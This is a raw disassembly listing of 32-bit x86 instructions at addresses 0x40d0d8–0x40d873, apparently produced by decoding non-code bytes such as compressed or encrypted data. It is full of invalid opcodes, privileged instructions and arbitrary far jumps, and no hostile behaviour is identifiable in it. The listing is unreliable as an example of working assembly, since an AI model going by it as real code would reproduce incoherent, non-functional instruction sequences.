  40d0d8:	mov    bh,0x68
  40d0da:	cmp    ebp,DWORD PTR [eax-0x6ebae73f]
  40d0e0:	std    
  40d0e1:	sub    ebp,DWORD PTR [edx]
  40d0e3:	dec    eax
  40d0e4:	mov    cl,0xd3
  40d0e6:	xor    eax,0xc6a5d68a
  40d0eb:	jecxz  0x40d0f0
  40d0ed:	std    
  40d0ee:	adc    DWORD PTR [esp+eax*2],edx
  40d0f1:	aad    0x29
  40d0f3:	scas   eax,DWORD PTR es:[edi]
  40d0f4:	je     0x40d12a
  40d0f6:	jecxz  0x40d0ea
  40d0f8:	mov    ecx,0xc8ca880e
  40d0fd:	inc    edi
  40d0fe:	push   edi
  40d0ff:	iret   
  40d100:	mov    ds:0x26c98090,eax
  40d105:	jmp    0x40d0dd
  40d107:	add    esi,DWORD PTR [eax+0x4c07c67f]
  40d10d:	dec    edx
  40d10e:	int3   
  40d10f:	es aas 
  40d111:	jl     0x40d135
  40d113:	adc    ecx,DWORD PTR [ebx-0x4]
  40d116:	pushw  es
  40d118:	mov    eax,ds:0xcc9897dd
  40d11d:	mov    ch,0xe9
  40d11f:	div    BYTE PTR [edx+esi*8]
  40d122:	into   
  40d123:	push   ecx
  40d124:	and    eax,0xc1084246
  40d129:	dec    esi
  40d12a:	jnp    0x40d161
  40d12c:	sti    
  40d12d:	lods   al,BYTE PTR ds:[esi]
  40d12e:	or     DWORD PTR [ecx-0x74],esi
  40d131:	addr16 pop esi
  40d133:	test   al,0xf2
  40d135:	(bad)  
  40d136:	dec    cl
  40d138:	out    dx,eax
  40d139:	push   edx
  40d13a:	test   eax,0x999999d4
  40d13f:	mov    cl,0x73
  40d141:	xor    edx,DWORD PTR [edx+0x59c6b124]
  40d147:	add    edx,ecx
  40d149:	frstor [ebp-0x6d]
  40d14c:	rol    esi,1
  40d14e:	hlt    
  40d14f:	jge    0x40d108
  40d151:	(bad)  [ebp+0x7e]
  40d154:	jle    0x40d0f4
  40d156:	push   0xffffffb5
  40d158:	into   
  40d159:	das    
  40d15a:	(bad)  
  40d15b:	ficom  DWORD PTR [edi+0x59]
  40d15e:	mov    esi,0xa93783e8
  40d163:	sbb    BYTE PTR [eax+0x49e7e928],al
  40d169:	push   edx
  40d16a:	jmp    0xe3d8151a
  40d16f:	cmp    BYTE PTR [ecx],ah
  40d171:	xchg   ebx,eax
  40d172:	mov    eax,ds:0xf8b93637
  40d177:	arpl   bx,di
  40d179:	pop    esi
  40d17a:	shr    DWORD PTR ss:[esi+0x271bd4ce],cl
  40d181:	or     DWORD PTR [ecx],ecx
  40d183:	xchg   edx,eax
  40d184:	pop    eax
  40d185:	dec    edx
  40d186:	bound  ebx,QWORD PTR [ecx-0x6d8a018]
  40d18c:	xchg   ch,ch
  40d18e:	lahf   
  40d18f:	jl     0x40d1fe
  40d191:	xchg   BYTE PTR [ebp+edx*8+0x5c],al
  40d195:	mov    bl,dl
  40d197:	mov    esi,0x9bf6734c
  40d19c:	test   eax,0x23ab52bb
  40d1a1:	into   
  40d1a2:	xor    esi,ecx
  40d1a4:	mov    ch,0xd4
  40d1a6:	ja     0x40d13a
  40d1a8:	fnstcw WORD PTR [ebp+0x3a]
  40d1ab:	shl    DWORD PTR [eax+0x3afacb34],cl
  40d1b1:	retf   0xa9cd
  40d1b4:	scas   al,BYTE PTR es:[edi]
  40d1b5:	sub    esp,DWORD PTR [edi+ecx*1+0x4f]
  40d1b9:	enter  0x6a0c,0x73
  40d1bd:	fwait
  40d1be:	leave  
  40d1bf:	mov    eax,ds:0xbc1083b1
  40d1c4:	in     eax,0xe5
  40d1c6:	shl    bl,0x6d
  40d1c9:	aaa    
  40d1ca:	or     BYTE PTR [eax-0x7efbdada],ah
  40d1d0:	scas   eax,DWORD PTR es:[edi]
  40d1d1:	imul   eax,DWORD PTR [ebx],0x1a
  40d1d4:	add    dh,bh
  40d1d6:	xor    al,0x2
  40d1d8:	push   eax
  40d1d9:	cmc    
  40d1da:	repnz xchg edx,eax
  40d1dc:	inc    esp
  40d1dd:	sbb    DWORD PTR [edx],eax
  40d1df:	push   ebx
  40d1e0:	adc    eax,0xddb52b20
  40d1e5:	mov    edi,0xccfa18dd
  40d1ea:	mov    edx,0x144133f9
  40d1ef:	stc    
  40d1f0:	jnp    0x40d206
  40d1f2:	jo     0x40d1c9
  40d1f4:	xchg   ecx,eax
  40d1f5:	jmp    0x40d18f
  40d1f7:	ins    DWORD PTR es:[edi],dx
  40d1f8:	std    
  40d1f9:	jle    0x40d23a
  40d1fb:	xchg   ebp,eax
  40d1fc:	jo     0x40d1f8
  40d1fe:	mov    edx,0x890952e5
  40d203:	loopne 0x40d201
  40d205:	test   DWORD PTR [esi],ecx
  40d207:	mov    BYTE PTR [edx],bh
  40d209:	pop    ecx
  40d20a:	mov    ebp,0xc344b54f
  40d20f:	(bad)  
  40d210:	sub    BYTE PTR [edx-0x666afce8],dl
  40d216:	add    al,0x95
  40d218:	inc    edx
  40d219:	jp     0x40d210
  40d21b:	fisttp WORD PTR [esi+0x30]
  40d21e:	pop    edi
  40d21f:	dec    edx
  40d220:	jnp    0x40d1b6
  40d222:	and    eax,0x32faf480
  40d227:	jae    0x40d1b5
  40d229:	dec    ebx
  40d22a:	jecxz  0x40d205
  40d22c:	pop    es
  40d22d:	mov    DWORD PTR [ebp+0x32d07b],edx
  40d233:	ins    DWORD PTR es:[edi],dx
  40d234:	pop    es
  40d235:	mov    al,0xd7
  40d237:	cmp    dh,BYTE PTR ss:[ecx]
  40d23a:	and    al,0x4c
  40d23c:	repnz lds edi,FWORD PTR [edi]
  40d23f:	pop    ebp
  40d240:	jecxz  0x40d209
  40d242:	(bad)  
  40d243:	aad    0xef
  40d245:	repz (bad) 
  40d247:	jmp    ecx
  40d249:	ja     0x40d21b
  40d24b:	in     eax,dx
  40d24c:	jbe    0x40d2a7
  40d24e:	pop    ebx
  40d24f:	pop    ebx
  40d250:	mov    ds:0x308f2e5c,eax
  40d255:	dec    ecx
  40d256:	push   edi
  40d257:	sbb    eax,0x60c01170
  40d25c:	xor    BYTE PTR [eax-0xf8cd1a4],ah
  40d262:	loopne 0x40d2a5
  40d264:	repz fldenv ds:[edi+0x78]
  40d269:	in     al,0xcb
  40d26b:	xchg   edi,eax
  40d26c:	mov    BYTE PTR [edx-0x74085afb],dl
  40d272:	sbb    bl,BYTE PTR [ecx-0x23]
  40d275:	pop    edx
  40d276:	cmc    
  40d277:	mov    edx,DWORD PTR [edx+ebp*1-0x6405dd31]
  40d27e:	lds    edx,FWORD PTR [ecx-0x43903bb0]
  40d284:	call   0xef57:0x39af8336
  40d28b:	adc    BYTE PTR [edx+0x1b],al
  40d28e:	gs popf 
  40d290:	retf   
  40d291:	fidivr DWORD PTR [esi+0x5c392936]
  40d297:	fcomp  DWORD PTR [esi+0x17d08a2]
  40d29d:	sti    
  40d29e:	out    dx,al
  40d29f:	(bad)  
  40d2a0:	push   ss
  40d2a1:	xchg   ebp,eax
  40d2a2:	in     al,0x5c
  40d2a4:	add    BYTE PTR [edx+0x23],0xa7
  40d2a8:	(bad)  
  40d2a9:	fldenv [esi-0x2]
  40d2ac:	das    
  40d2ad:	mov    esi,0x1d0ff98e
  40d2b2:	xlat   BYTE PTR ds:[ebx]
  40d2b3:	nop
  40d2b4:	jp     0x40d2b7
  40d2b6:	loop   0x40d300
  40d2b8:	adc    al,BYTE PTR [edi+0x43133331]
  40d2be:	add    bl,BYTE PTR [edi+0x31]
  40d2c1:	call   0xec95:0x2a53e122
  40d2c8:	xor    al,0xeb
  40d2ca:	add    bh,BYTE PTR [ebx-0x29]
  40d2cd:	out    0xc8,al
  40d2cf:	aaa    
  40d2d0:	mov    esi,0xa626edc5
  40d2d5:	add    ecx,DWORD PTR [ebx]
  40d2d7:	cmp    al,0xcf
  40d2d9:	mov    bh,0x7a
  40d2db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2dc:	jmp    0x40d2a0
  40d2de:	push   ecx
  40d2df:	cmc    
  40d2e0:	add    dl,bl
  40d2e2:	(bad)  
  40d2e3:	push   esp
  40d2e4:	fnsave fs:[edi-0x5f]
  40d2e8:	out    0xf5,al
  40d2ea:	or     al,0x7e
  40d2ec:	out    0x1c,al
  40d2ee:	pop    ss
  40d2ef:	ds cdq 
  40d2f1:	ins    DWORD PTR es:[edi],dx
  40d2f2:	out    dx,al
  40d2f3:	cmc    
  40d2f4:	fsubr  st(6),st
  40d2f6:	sbb    dl,BYTE PTR [ebx]
  40d2f8:	(bad)  
  40d2fa:	mov    ss,WORD PTR [bp+di]
  40d2fd:	retf   0x67dd
  40d300:	mov    ah,BYTE PTR [edi+0x78]
  40d303:	jno    0x40d291
  40d305:	adc    al,0x6a
  40d307:	pop    esi
  40d308:	inc    eax
  40d309:	lods   eax,DWORD PTR ds:[esi]
  40d30a:	pop    esi
  40d30b:	mov    ds:0xbeb01ddb,eax
  40d310:	mov    ?,WORD PTR [esi+0x7273174e]
  40d316:	inc    ebp
  40d317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d318:	test   eax,0x8613c9fb
  40d31d:	pusha  
  40d31e:	shl    bh,cl
  40d320:	xchg   BYTE PTR [edx],ah
  40d322:	mov    ds:0xa5e347cf,al
  40d327:	mov    edi,0xc3b35479
  40d32c:	aam    0x89
  40d32e:	fadd   QWORD PTR [ebx+0x553d59c4]
  40d334:	and    al,0x19
  40d336:	sbb    eax,0x82790539
  40d33b:	sub    BYTE PTR [ecx+0x733e77e6],bl
  40d341:	test   ecx,ebx
  40d343:	fxch   st(7)
  40d345:	repz aaa 
  40d347:	inc    edi
  40d349:	ja     0x40d31c
  40d34b:	outs   dx,BYTE PTR ds:[esi]
  40d34c:	mov    bh,0xe9
  40d34e:	je     0x40d38a
  40d350:	aam    0x6a
  40d352:	mov    ch,0x11
  40d354:	mov    ebp,0xc8193f3f
  40d359:	and    BYTE PTR [ebp-0x64411045],al
  40d35f:	or     edx,DWORD PTR [edi+0x4ff5f8b6]
  40d365:	cmp    eax,0x9a776c3
  40d36a:	mov    ds:0x63a519a1,al
  40d36f:	xor    BYTE PTR [ebx],0x2f
  40d372:	xchg   esp,eax
  40d373:	dec    eax
  40d374:	pop    ebp
  40d375:	sti    
  40d376:	push   esp
  40d377:	or     DWORD PTR [esi+0x28a720d8],eax
  40d37d:	not    BYTE PTR es:[eax+0xe]
  40d381:	or     al,0xd5
  40d383:	jnp    0x40d37b
  40d385:	sbb    DWORD PTR ds:0xc6e3a731,ecx
  40d38b:	xor    DWORD PTR [edx+eiz*2-0x55e98220],esi
  40d392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d393:	jecxz  0x40d322
  40d395:	int3   
  40d396:	mov    cl,0xe9
  40d398:	mov    esi,0x96dabaec
  40d39d:	push   ebp
  40d39e:	xor    esi,DWORD PTR [edx]
  40d3a0:	jp     0x40d361
  40d3a2:	jp     0x40d325
  40d3a4:	int3   
  40d3a5:	push   cs
  40d3a6:	stos   DWORD PTR es:[edi],eax
  40d3a7:	push   ebp
  40d3a8:	call   0x75865d1a
  40d3ad:	retf   0xafff
  40d3b0:	xchg   edx,eax
  40d3b1:	xor    esp,0x93677239
  40d3b7:	push   0xffffffb5
  40d3b9:	dec    esp
  40d3ba:	scas   eax,DWORD PTR es:[edi]
  40d3bb:	scas   eax,DWORD PTR es:[edi]
  40d3bc:	adc    ch,BYTE PTR [ecx+0x7a01f3e4]
  40d3c2:	sahf   
  40d3c3:	inc    edi
  40d3c4:	stos   DWORD PTR es:[edi],eax
  40d3c5:	aad    0x1a
  40d3c7:	jno    0x40d3ca
  40d3c9:	jmp    0xdbab:0x70df91b6
  40d3d0:	dec    ebp
  40d3d1:	add    eax,0x4185a502
  40d3d6:	add    al,0x2e
  40d3d8:	or     eax,0xc698292b
  40d3dd:	test   al,0x1b
  40d3df:	into   
  40d3e0:	imul   ebx,DWORD PTR [edx-0x6f],0x7
  40d3e4:	mov    al,ds:0x64ef6a48
  40d3e9:	fdiv   DWORD PTR [ebx-0x77]
  40d3ec:	mov    eax,0x6f3b088
  40d3f1:	sub    al,0x17
  40d3f3:	and    DWORD PTR [eax+0x3601061e],edi
  40d3f9:	push   fs
  40d3fb:	jno    0x40d400
  40d3fd:	or     cl,bh
  40d3ff:	and    ecx,DWORD PTR [edx+0x3a8dea63]
  40d405:	fucomp st(6)
  40d407:	nop
  40d408:	outs   dx,BYTE PTR ds:[esi]
  40d409:	mov    edi,0xd3ff085a
  40d40e:	addr16 push edx
  40d410:	nop
  40d411:	dec    edi
  40d412:	lds    ebp,FWORD PTR [eax-0xeb0b785]
  40d418:	mov    edi,DWORD PTR [ebx+edi*8-0x76190332]
  40d41f:	fist   DWORD PTR [ebp-0x21028616]
  40d425:	cmp    eax,0xa99a86f7
  40d42a:	in     al,dx
  40d42b:	arpl   WORD PTR [ebx],di
  40d42d:	add    ch,BYTE PTR [edi+esi*2+0x501de300]
  40d434:	(bad)  
  40d435:	or     al,0xe3
  40d437:	pop    ecx
  40d438:	jle    0x40d423
  40d43a:	aas    
  40d43b:	lahf   
  40d43c:	in     eax,0xce
  40d43e:	cmp    ebx,DWORD PTR [esi-0x4090621b]
  40d444:	xchg   DWORD PTR [edi],esp
  40d446:	lahf   
  40d447:	jl     0x40d3db
  40d449:	outs   dx,BYTE PTR ds:[esi]
  40d44a:	mov    bh,0x4b
  40d44c:	test   eax,0x2831da54
  40d451:	dec    eax
  40d452:	dec    edx
  40d453:	adc    eax,0x3f3f33f0
  40d458:	iret   
  40d459:	(bad)  
  40d45a:	les    esp,FWORD PTR [edi+edi*8]
  40d45d:	idiv   bh
  40d45f:	(bad)  
  40d460:	pop    ebp
  40d461:	mov    ?,WORD PTR [ebp+0x57b2403c]
  40d467:	pop    es
  40d468:	std    
  40d469:	mov    eax,0x3cd8815
  40d46e:	sbb    BYTE PTR [eax],ah
  40d470:	xchg   edx,eax
  40d471:	call   0x495ef810
  40d476:	in     al,dx
  40d477:	pop    ecx
  40d478:	push   ebp
  40d479:	mov    DWORD PTR es:[ebx],edx
  40d47c:	push   esp
  40d47d:	outs   dx,DWORD PTR ds:[esi]
  40d47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47f:	jbe    0x40d4a4
  40d481:	push   ebx
  40d482:	sub    DWORD PTR [ecx],edi
  40d484:	sbb    eax,0x445b0213
  40d489:	push   ebp
  40d48a:	test   al,0x80
  40d48c:	pop    ds
  40d48d:	imul   esi,esp,0xef8e8cf5
  40d493:	push   ds
  40d494:	outs   dx,DWORD PTR ds:[esi]
  40d495:	rol    BYTE PTR [eax-0x66f6a3df],1
  40d49b:	mov    al,ds:0xe0d6d722
  40d4a0:	jle    0x40d502
  40d4a2:	loope  0x40d4bc
  40d4a4:	push   cs
  40d4a5:	xor    ebx,DWORD PTR [ebp+0x199aaeab]
  40d4ab:	mov    ds:0x155a2412,eax
  40d4b0:	push   ecx
  40d4b1:	adc    eax,DWORD PTR [edx+0x789204e2]
  40d4b7:	rcl    ah,0x44
  40d4ba:	pusha  
  40d4bb:	(bad)  
  40d4bc:	mov    eax,ds:0xc66d861b
  40d4c1:	stos   DWORD PTR es:[edi],eax
  40d4c2:	stos   DWORD PTR es:[edi],eax
  40d4c3:	ds out 0x9b,eax
  40d4c6:	adc    dl,ah
  40d4c8:	mov    dh,0x94
  40d4ca:	add    esi,DWORD PTR [ebx-0x25]
  40d4cd:	dec    ebp
  40d4ce:	mov    edx,0xcbf9dd01
  40d4d3:	(bad)  
  40d4d4:	in     al,0x98
  40d4d6:	in     al,dx
  40d4d7:	jb     0x40d52f
  40d4d9:	add    eax,0xf29a1bc8
  40d4de:	sub    BYTE PTR [eax-0x49],ah
  40d4e1:	mov    esi,0x1d15b77c
  40d4e6:	jecxz  0x40d536
  40d4e8:	lea    esi,[ebp+0x19]
  40d4eb:	sub    DWORD PTR [ecx+0x10e8400],0x4c8c7116
  40d4f5:	adc    ch,dl
  40d4f7:	mov    ch,0x1a
  40d4f9:	pop    ebx
  40d4fa:	popf   
  40d4fb:	nop
  40d4fc:	pop    esi
  40d4fd:	mov    edi,0xd7d4ea94
  40d502:	push   0x69034066
  40d507:	jp     0x40d506
  40d509:	sbb    eax,0xbafd5b88
  40d50e:	les    ebp,FWORD PTR ds:0x29b8732d
  40d514:	ret    0x3ccf
  40d517:	dec    eax
  40d518:	add    al,dl
  40d51a:	push   ebp
  40d51b:	pop    es
  40d51c:	shl    BYTE PTR [ecx+edi*4],0xcc
  40d520:	push   ss
  40d521:	cld    
  40d522:	adc    BYTE PTR [ebx+edi*2-0x403b038d],dh
  40d529:	jle    0x40d4ad
  40d52b:	add    edi,ebx
  40d52d:	div    DWORD PTR [eax-0x21]
  40d530:	jge    0x40d529
  40d532:	icebp  
  40d533:	in     al,0x93
  40d535:	dec    edi
  40d536:	adc    al,BYTE PTR [ebp-0x6f]
  40d539:	or     eax,0xa77fca88
  40d53e:	loope  0x40d5b0
  40d540:	dec    eax
  40d541:	test   eax,0xa1d0e254
  40d546:	cmp    edi,eax
  40d548:	mov    ebp,0xe7c53ccf
  40d54d:	mov    esi,0xd9289178
  40d552:	add    edi,DWORD PTR [esi+0x53]
  40d555:	(bad)  [ecx+0x24]
  40d558:	fs dec ebx
  40d55a:	mov    DWORD PTR [ebx+0x49df4807],ebx
  40d560:	push   0xffffffc6
  40d562:	sbb    al,0x27
  40d564:	sahf   
  40d565:	(bad)  
  40d566:	mov    ebx,0xc55488d
  40d56b:	aam    0x58
  40d56d:	clc    
  40d56e:	test   eax,edx
  40d570:	sahf   
  40d571:	and    al,0xe9
  40d573:	mov    gs,WORD PTR ds:0x9e44263d
  40d579:	lock push ebp
  40d57b:	lods   eax,DWORD PTR ds:[esi]
  40d57c:	push   es
  40d57d:	popa   
  40d57e:	sbb    DWORD PTR [edi-0x2f4afb35],ebp
  40d584:	add    ch,cl
  40d586:	adc    ah,dh
  40d588:	sti    
  40d589:	or     BYTE PTR [ecx-0x1744f67a],dl
  40d58f:	outs   dx,BYTE PTR ds:[esi]
  40d590:	pop    es
  40d591:	cmc    
  40d592:	xor    DWORD PTR [ebp+0x7],edx
  40d595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d596:	sti    
  40d597:	dec    edx
  40d598:	push   esi
  40d599:	cli    
  40d59a:	mov    ebx,0x39130af5
  40d59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5a0:	push   edx
  40d5a1:	icebp  
  40d5a2:	inc    esi
  40d5a3:	mov    esi,0x529659b9
  40d5a8:	inc    ebp
  40d5a9:	cdq    
  40d5aa:	push   ss
  40d5ab:	inc    ebp
  40d5ac:	add    dl,ch
  40d5ae:	cmc    
  40d5af:	fucomi st,st(2)
  40d5b1:	add    al,BYTE PTR [ebx+ebx*4-0x11cbfb74]
  40d5b8:	cmp    eax,0xaccc40e1
  40d5bd:	xchg   esp,eax
  40d5be:	push   ebp
  40d5bf:	popf   
  40d5c0:	out    dx,eax
  40d5c1:	sti    
  40d5c2:	pop    esi
  40d5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c4:	xor    BYTE PTR [eax+0x648cb83b],cl
  40d5ca:	jbe    0x40d5a1
  40d5cc:	add    DWORD PTR [edi-0xb4d89ad],esi
  40d5d2:	out    dx,eax
  40d5d3:	mov    ah,0xe
  40d5d5:	mov    WORD PTR [eax-0x2a],?
  40d5d8:	and    dl,BYTE PTR [ebp+0x28db42c1]
  40d5de:	rcl    BYTE PTR [ebp-0x187bec83],cl
  40d5e4:	imul   eax,esp,0x358c682c
  40d5ea:	cmp    BYTE PTR [ecx+0x2f41857c],bh
  40d5f0:	inc    eax
  40d5f1:	jmp    0x1804bc99
  40d5f6:	sub    esp,edx
  40d5f8:	xor    al,BYTE PTR [ecx+0x23a01518]
  40d5fe:	gs xchg esi,eax
  40d600:	cdq    
  40d601:	gs sub eax,0x7cbaa3ff
  40d607:	jbe    0x40d589
  40d609:	pop    esp
  40d60a:	mov    ds:0xd9b46ff3,eax
  40d60f:	repnz fiadd WORD PTR ds:0x4cb0136
  40d616:	and    al,0xe0
  40d618:	mov    bl,0xb2
  40d61a:	ss ret 
  40d61c:	daa    
  40d61d:	jg     0x40d613
  40d61f:	repz cld 
  40d621:	aas    
  40d622:	aas    
  40d623:	mul    DWORD PTR [ecx+0x1e]
  40d626:	jl     0x40d618
  40d628:	inc    ecx
  40d629:	sahf   
  40d62a:	js     0x40d60e
  40d62c:	or     DWORD PTR [esi],eax
  40d62e:	add    DWORD PTR [ecx],0xffffffb5
  40d631:	pop    edx
  40d632:	or     eax,0x3094d548
  40d637:	or     al,0x19
  40d639:	push   cs
  40d63a:	xchg   esp,ebx
  40d63c:	jae    0x40d60d
  40d63e:	cmp    eax,0xceb73d9c
  40d643:	scas   eax,DWORD PTR es:[edi]
  40d644:	inc    dh
  40d646:	xchg   ebx,eax
  40d647:	ins    BYTE PTR es:[edi],dx
  40d648:	mov    bh,0x1b
  40d64a:	and    BYTE PTR [edx-0x40ecb2c0],bl
  40d650:	jle    0x40d603
  40d652:	mov    esp,0x886ad554
  40d657:	and    dl,BYTE PTR [esi]
  40d659:	in     eax,0x16
  40d65b:	push   esp
  40d65c:	add    BYTE PTR ss:[ecx-0x1c],al
  40d660:	or     DWORD PTR [edx],eax
  40d662:	popf   
  40d663:	xor    ecx,edi
  40d665:	popw   es
  40d667:	adc    al,BYTE PTR [edx]
  40d669:	xor    dl,al
  40d66b:	cmp    al,0x15
  40d66d:	and    BYTE PTR [esi-0x2ce95aa0],al
  40d673:	mov    dh,al
  40d675:	lea    eax,[ebp+0x4ba3c4de]
  40d67b:	jnp    0x40d6f9
  40d67d:	inc    esi
  40d67e:	pop    esi
  40d67f:	cmp    ebp,ebx
  40d681:	(bad)  
  40d682:	fistp  WORD PTR [edi-0x18]
  40d685:	gs sub al,bl
  40d688:	outs   dx,BYTE PTR ds:[esi]
  40d689:	lahf   
  40d68a:	inc    edi
  40d68b:	fs pop edi
  40d68d:	sub    eax,0xcf4d0231
  40d692:	add    al,0xc
  40d694:	mov    eax,ds:0xebb98b59
  40d699:	loopne 0x40d6d3
  40d69b:	and    DWORD PTR [ecx-0x4f],0x7
  40d69f:	sar    BYTE PTR [edi+ebp*2+0x33],0x3f
  40d6a4:	and    edi,DWORD PTR [ebx+0x7f]
  40d6a7:	inc    edx
  40d6a8:	outs   dx,BYTE PTR ds:[esi]
  40d6a9:	push   ebx
  40d6aa:	cmp    eax,0x4ddb740
  40d6af:	add    eax,DWORD PTR [eax]
  40d6b1:	iret   
  40d6b2:	or     esi,esp
  40d6b4:	push   esp
  40d6b5:	pusha  
  40d6b6:	ja     0x40d6e6
  40d6b8:	and    BYTE PTR [ecx+0xe],0xa9
  40d6bc:	push   ds
  40d6bd:	lods   al,BYTE PTR ds:[esi]
  40d6be:	out    0x2,al
  40d6c0:	push   esp
  40d6c1:	in     eax,dx
  40d6c2:	jle    0x40d69b
  40d6c4:	rcl    BYTE PTR [edi+edx*4-0xccf7902],0x2a
  40d6cc:	or     DWORD PTR [ebx-0x14],0xb7770279
  40d6d3:	out    0x91,eax
  40d6d5:	ret    
  40d6d6:	dec    esi
  40d6d7:	(bad)  
  40d6d8:	or     ah,BYTE PTR [ecx]
  40d6da:	adc    BYTE PTR [esi+0x1bf9f2a7],bl
  40d6e0:	enter  0x7fab,0x7d
  40d6e4:	fbld   TBYTE PTR [edi+0x72]
  40d6e7:	jb     0x40d673
  40d6e9:	int    0xcd
  40d6eb:	out    0x29,eax
  40d6ed:	jns    0x40d736
  40d6ef:	dec    ecx
  40d6f0:	les    edi,FWORD PTR [esi]
  40d6f2:	bound  esp,QWORD PTR [esi-0x69bea9c0]
  40d6f8:	rcl    BYTE PTR [edi-0x1938a5e6],0xa2
  40d6ff:	dec    eax
  40d700:	or     esi,DWORD PTR [ecx-0x6b]
  40d703:	xor    eax,0xdc408b39
  40d708:	sti    
  40d709:	out    0xa5,al
  40d70b:	jmp    FWORD PTR ds:0x25db5268
  40d711:	inc    esi
  40d712:	cwde   
  40d713:	or     BYTE PTR [eax-0x2b],0x1
  40d717:	or     ecx,edi
  40d719:	sub    ebx,DWORD PTR [edi+edi*1]
  40d71c:	push   ecx
  40d71d:	out    0xef,eax
  40d71f:	(bad)  
  40d720:	outs   dx,DWORD PTR ds:[esi]
  40d721:	mov    edi,0xf3fe4fc5
  40d726:	psllw  mm6,mm0
  40d729:	ret    
  40d72a:	psllq  mm3,mm4
  40d72d:	jae    0x40d6fe
  40d72f:	jno    0x40d726
  40d731:	jmp    0x79e0:0x25cd2055
  40d738:	push   ds
  40d739:	ja     0x40d71a
  40d73b:	jge    0x40d774
  40d73d:	xor    esi,DWORD PTR [ebx]
  40d73f:	repz cld 
  40d741:	int3   
  40d742:	mov    edi,0x9c4e4dff
  40d747:	mov    ss,WORD PTR [ecx-0x2a5665e]
  40d74d:	push   ebp
  40d74e:	pop    es
  40d74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d750:	das    
  40d751:	push   0x5be8fdd
  40d756:	push   es
  40d757:	ror    BYTE PTR [ebx+0x74],cl
  40d75a:	sub    al,0x80
  40d75c:	sub    bl,BYTE PTR [ebx-0x6eceb8e3]
  40d762:	(bad)  
  40d763:	hlt    
  40d764:	sahf   
  40d765:	adc    al,0x8e
  40d767:	jle    0x40d7d6
  40d769:	into   
  40d76a:	aad    0x46
  40d76c:	push   ebp
  40d76d:	xchg   edi,eax
  40d76e:	clc    
  40d76f:	lods   al,BYTE PTR ds:[esi]
  40d770:	xchg   edx,eax
  40d771:	out    dx,al
  40d772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d773:	mov    bh,0xb2
  40d775:	inc    ecx
  40d776:	aas    
  40d777:	imul   edi,DWORD PTR [ecx+ecx*4+0x2b],0x822af294
  40d77f:	add    al,BYTE PTR [edx]
  40d781:	mov    ?,esp
  40d783:	mov    bh,0xaa
  40d785:	cmp    bl,0x51
  40d788:	push   edx
  40d789:	fild   DWORD PTR [ebx+0x26]
  40d78c:	pop    ds
  40d78d:	mov    al,ds:0xa4fb2e7e
  40d792:	(bad)  
  40d793:	push   es
  40d794:	and    BYTE PTR [ebp+0x35],ch
  40d797:	mov    al,ds:0xbd98f189
  40d79c:	repz or eax,0xf857b0a2
  40d7a2:	jns    0x40d730
  40d7a4:	shr    BYTE PTR [ebx-0x4b],0x5a
  40d7a8:	sbb    DWORD PTR [esp+ebp*4+0x156c045b],esp
  40d7af:	sahf   
  40d7b0:	js     0x40d7bd
  40d7b2:	fisttp DWORD PTR [ebp+0x4c]
  40d7b5:	pop    es
  40d7b6:	div    BYTE PTR [esp+ecx*2]
  40d7b9:	xor    ebx,DWORD PTR [eax+edi*1-0x55]
  40d7bd:	inc    edi
  40d7be:	(bad)  
  40d7bf:	jmp    0xef77:0x9e485955
  40d7c6:	in     eax,0xd
  40d7c8:	jne    0x40d830
  40d7ca:	jg     0x40d7dd
  40d7cc:	and    dh,BYTE PTR [eax-0x51]
  40d7cf:	jae    0x40d7fe
  40d7d1:	clc    
  40d7d2:	lahf   
  40d7d3:	addr16 sbb cl,bh
  40d7d6:	jae    0x40d815
  40d7d8:	and    DWORD PTR [eax-0x15f5d55c],ecx
  40d7de:	stc    
  40d7df:	mov    esi,0x84920752
  40d7e4:	pop    edx
  40d7e5:	lods   eax,DWORD PTR ds:[esi]
  40d7e6:	inc    esi
  40d7e7:	pushf  
  40d7e8:	or     BYTE PTR [esi-0x203426e4],cl
  40d7ee:	stc    
  40d7ef:	fwait
  40d7f0:	sti    
  40d7f1:	pop    ecx
  40d7f2:	ds jnp 0x40d78e
  40d7f5:	in     eax,0xe5
  40d7f7:	jecxz  0x40d855
  40d7f9:	pop    edx
  40d7fa:	test   eax,0xa355beb0
  40d7ff:	aas    
  40d800:	pushf  
  40d801:	and    al,0xe
  40d803:	test   DWORD PTR [eax+0x4d2a26c],0x8240a7b
  40d80d:	nop
  40d80e:	xor    al,BYTE PTR [edx-0x6e]
  40d811:	and    BYTE PTR [edx-0x1c3176f8],dl
  40d817:	xchg   ebx,eax
  40d818:	xchg   ecx,eax
  40d819:	not    bh
  40d81b:	xor    BYTE PTR [eax],ch
  40d81d:	jl     0x40d842
  40d81f:	pop    ebx
  40d820:	and    DWORD PTR [ebx],edx
  40d822:	and    BYTE PTR [ebp+0x7],dl
  40d825:	nop
  40d826:	sbb    BYTE PTR [ebx-0x1c315b5f],ah
  40d82c:	dec    edi
  40d82d:	(bad)  
  40d82e:	jl     0x40d82c
  40d830:	scas   eax,DWORD PTR es:[edi]
  40d831:	(bad)  
  40d832:	sub    bl,bh
  40d834:	push   DWORD PTR [ecx+0x3f97f2d7]
  40d83a:	hlt    
  40d83b:	adc    BYTE PTR [ebp+0x572b874e],bl
  40d841:	scas   al,BYTE PTR es:[edi]
  40d842:	fdivr  DWORD PTR [ecx]
  40d844:	adc    dl,BYTE PTR [ebx+0x53]
  40d847:	push   ebx
  40d848:	js     0x40d8c8
  40d84a:	popf   
  40d84b:	lahf   
  40d84c:	sti    
  40d84d:	(bad)  
  40d84e:	lahf   
  40d84f:	in     eax,0x8f
  40d851:	pop    ds
  40d852:	cmp    DWORD PTR [edi-0x3e],ecx
  40d855:	sub    al,0xd0
  40d857:	inc    eax
  40d858:	stc    
  40d859:	cld    
  40d85a:	sbb    eax,0x5412d18
  40d85f:	jmp    0xcd8620fc
  40d864:	adc    al,0x2c
  40d866:	jecxz  0x40d83b
  40d868:	sub    BYTE PTR [ecx+0x5b],cl
  40d86b:	into   
  40d86c:	and    cl,BYTE PTR gs:[ecx+0x3e305189]
  40d873:	or     eax,edi
